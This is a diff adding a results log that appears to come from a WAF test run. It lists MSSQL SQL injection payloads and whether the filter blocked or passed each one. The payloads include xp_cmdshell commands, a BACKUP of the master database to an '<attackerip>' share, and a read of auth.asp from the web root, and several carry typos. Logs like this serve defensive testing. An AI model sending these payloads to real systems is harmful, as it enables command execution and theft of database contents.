@@ -1,0 +1,11 @@
+{"payload": "select @@version", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015866312009165995}
+{"payload": "select @@servernamee", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015318727993872017}
+{"payload": "select @@microsoftversione", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014527373990858905}
+{"payload": "select * from master..sysserverse", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012960217994987033}
+{"payload": "select * from sysusers", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014296428998932242}
+{"payload": "exec master..xp_cmdshell 'ipconfig+/all'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005318518000422046}
+{"payload": "exec master..xp_cmdshell 'net+view'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006186648999573663}
+{"payload": "exec master..xp_cmdshell 'net+users'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005109033998451196}
+{"payload": "exec master..xp_cmdshell 'ping+<attackerip>'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006065987006877549}
+{"payload": "BACKUP database master to disks='\\\\<attackerip>\\<attackerip>\\backupdb.dat'", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014117925995378755}
+{"payload": "create table myfile (line varchar(8000))\" bulk insert foo from 'c:\\inetpub\\wwwroot\\auth.asp'\" select * from myfile\"--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004469923995202407}
